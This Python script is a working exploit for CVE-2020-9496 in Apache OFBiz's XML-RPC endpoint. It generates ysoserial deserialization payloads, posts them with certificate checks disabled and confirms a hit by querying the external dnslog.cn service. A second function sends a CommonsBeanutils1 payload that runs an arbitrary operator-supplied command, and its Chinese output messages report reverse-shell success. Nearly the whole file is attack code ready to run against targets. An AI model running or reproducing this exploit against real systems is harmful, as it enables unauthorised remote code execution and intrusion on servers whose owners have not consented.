import subprocess
import requests
from time import sleep
import base64
from requests.packages.urllib3.exceptions import InsecureRequestWarning


def dnslog():
    global dns_session
    dns_session = requests.session()
    dns = dns_session.get('http://www.dnslog.cn/getdomain.php')
    return dns.text


def dnslog_res():
    dns_res = dns_session.get('http://www.dnslog.cn/getrecords.php')
    if dns_res.json():
        return True
    else:
        return False


def CVE_2020_9496(target_url):
    target_url = target_url.strip()
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    headers = {'Content-Type': 'application/xml'}
    # popen = subprocess.Popen(['java', '-jar', 'ysoserial.jar', "CommonsBeanutils1", 'ping '+dnslog()], stdout=subprocess.PIPE)
    popen = subprocess.Popen(['java', '-jar', 'ysoserial.jar', "URLDNS", 'http://'+dnslog()], stdout=subprocess.PIPE)
    data = base64.b64encode(popen.stdout.read())  # base64编码
    post_data = f'''<?xml version="1.0"?><methodCall><methodName>ProjectDiscovery</methodName><params><param><value><struct><member><name>test</name><value><serializable xmlns="http://ws.apache.org/xmlrpc/namespaces/extensions">{str(data, 'utf-8')}</serializable></value></member></struct></value></param></params></methodCall>'''
    if target_url.startswith('https://'):
        vuln_url = target_url + "/webtools/control/xmlrpc"
    else:
        vuln_url = 'https://' + target_url + "/webtools/control/xmlrpc"
    try:
        r = requests.post(vuln_url, data=post_data, headers=headers, verify=False, timeout=5)
        if r.status_code == 200:
            sleep(2)
            if dnslog_res():
                print(f'\033[36m[+] {target_url} CVE_2020_9496 dnslog验证成功 \033[0m')
                return True
            else:
                print(f'\033[31m[x] {target_url} CVE_2020_9496 利用失败 \033[0m')
    except Exception:
        print(f"\033[31m[x] {target_url} CVE_2020_9496 poc请求失败 \033[0m")


def CVE_2020_9496_shell(target_url, cmd):
    target_url = target_url.strip()
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    headers = {'Content-Type': 'application/xml'}
    popen = subprocess.Popen(['java', '-jar', 'ysoserial.jar', "CommonsBeanutils1", cmd], stdout=subprocess.PIPE)
    data = base64.b64encode(popen.stdout.read())
    post_data = f'''<?xml version="1.0"?><methodCall><methodName>ProjectDiscovery</methodName><params><param><value><struct><member><name>test</name><value><serializable xmlns="http://ws.apache.org/xmlrpc/namespaces/extensions">{str(data, 'utf-8')}</serializable></value></member></struct></value></param></params></methodCall>'''
    if target_url.startswith('https://'):
        vuln_url = target_url + "/webtools/control/xmlrpc"
    else:
        vuln_url = 'https://' + target_url + "/webtools/control/xmlrpc"
    try:
        r = requests.post(vuln_url, data=post_data, headers=headers, verify=False, timeout=5)
        if r.status_code == 200:
            sleep(2)
            print(f'\033[36m[+] {target_url} CVE_2020_9496 反弹shell成功 \033[0m')
            return True
        else:
            print(f'\033[31m[x] {target_url} CVE_2020_9496 利用失败 \033[0m')
    except Exception:
        print(f"\033[31m[x] {target_url} CVE_2020_9496 poc请求超时 \033[0m")


if __name__ == '__main__':
    url = str(input("\033[35mInput Url >>> \033[0m"))
    if url:
        CVE_2020_9496(url)